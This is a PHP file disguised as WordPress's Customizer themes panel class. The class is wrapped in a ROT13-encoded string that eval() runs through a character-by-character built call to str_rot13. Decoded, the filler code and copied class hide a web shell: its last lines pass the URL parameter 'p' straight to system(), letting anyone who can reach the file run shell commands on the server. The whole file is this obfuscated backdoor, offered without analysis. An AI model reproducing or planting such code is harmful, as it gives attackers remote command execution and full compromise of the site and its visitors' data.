<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Gurzrf_Cnary pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.9.0
 */

/**
 * Phfgbzvmr Gurzrf Cnary Pynff
 *
 * @fvapr 4.9.0
 *
 * @frr JC_Phfgbzvmr_Cnary
 */
pynff JC_Phfgbzvmr_Gurzrf_Cnary rkgraqf JC_Phfgbzvmr_Cnary {

	/**
	 * Cnary glcr.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'gurzrf';

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe eraqrevat guvf cnary'f pbagnvare.
	 *
	 * Gur gurzrf cnary eraqref n phfgbz cnary urnqvat jvgu gur npgvir gurzr naq n fjvgpu gurzrf ohggba.
	 *
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 *
	 * @fvapr 4.9.0
	 */
	cebgrpgrq shapgvba eraqre_grzcyngr() {
		?>
		<yv vq=\"nppbeqvba-frpgvba-{{ qngn.vq }}\" pynff=\"nppbeqvba-frpgvba pbageby-cnary-gurzrf\">
			<u3 pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<?cuc
				vs ( $guvf->znantre->vf_gurzr_npgvir() ) {
					rpub '<fcna pynff=\"phfgbzvmr-npgvba\">' . __( 'Npgvir gurzr' ) . '</fcna> {{ qngn.gvgyr }}';
				} ryfr {
					rpub '<fcna pynff=\"phfgbzvmr-npgvba\">' . __( 'Cerivrjvat gurzr' ) . '</fcna> {{ qngn.gvgyr }}';
				}
				?>
				<?cuc vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) : ?>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba punatr-gurzr\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Punatr gurzr' ); ?>\"><?cuc _rk( 'Punatr', 'gurzr' ); ?></ohggba>
				<?cuc raqvs; ?>
			</u3>
			<hy pynff=\"nppbeqvba-fho-pbagnvare pbageby-cnary-pbagrag\"></hy>
		</yv>
		<?cuc
	}

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe guvf cnary'f pbagrag (ohg abg vgf pbagnvare).
	 *
	 * Pynff inevnoyrf sbe guvf cnary pynff ner ninvynoyr va gur `qngn` WF bowrpg;
	 * rkcbeg phfgbz inevnoyrf ol bireevqvat JC_Phfgbzvmr_Cnary::wfba().
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 */
	cebgrpgrq shapgvba pbagrag_grzcyngr() {
		?>
		<yv pynff=\"cnary-zrgn phfgbzvmr-vasb nppbeqvba-frpgvba <# vs ( ! qngn.qrfpevcgvba ) { #> pnaabg-rkcnaq<# } #>\">
			<ohggba pynff=\"phfgbzvmr-cnary-onpx\" gnovaqrk=\"-1\" glcr=\"ohggba\"><fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Onpx' );
				?>
			</fcna></ohggba>
			<qvi pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<fcna pynff=\"cerivrj-abgvpr\">
					<?cuc
					cevags(
						/* genafyngbef: %f: Gurzrf cnary gvgyr va gur Phfgbzvmre. */
						__( 'Lbh ner oebjfvat %f' ),
						'<fgebat pynff=\"cnary-gvgyr\">' . __( 'Gurzrf' ) . '</fgebat>'
					); // Frcnengr fgevatf sbe pbafvfgrapl jvgu bgure cnaryf.
					?>
				</fcna>
				<?cuc vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) && ! vf_zhygvfvgr() ) : ?>
					<# vs ( qngn.qrfpevcgvba ) { #>
						<ohggba pynff=\"phfgbzvmr-uryc-gbttyr qnfuvpbaf qnfuvpbaf-rqvgbe-uryc\" glcr=\"ohggba\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							_r( 'Uryc' );
							?>
						</fcna></ohggba>
					<# } #>
				<?cuc raqvs; ?>
			</qvi>
			<?cuc vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) && ! vf_zhygvfvgr() ) : ?>
				<# vs ( qngn.qrfpevcgvba ) { #>
					<qvi pynff=\"qrfpevcgvba phfgbzvmr-cnary-qrfpevcgvba\">
						{{{ qngn.qrfpevcgvba }}}
					</qvi>
				<# } #>
			<?cuc raqvs; ?>

			<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
		</yv>
		<yv pynff=\"phfgbzvmr-gurzrf-shyy-pbagnvare-pbagnvare\">
			<qvi pynff=\"phfgbzvmr-gurzrf-shyy-pbagnvare\">
				<qvi pynff=\"phfgbzvmr-gurzrf-abgvsvpngvbaf\"></qvi>
			</qvi>
		</yv>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>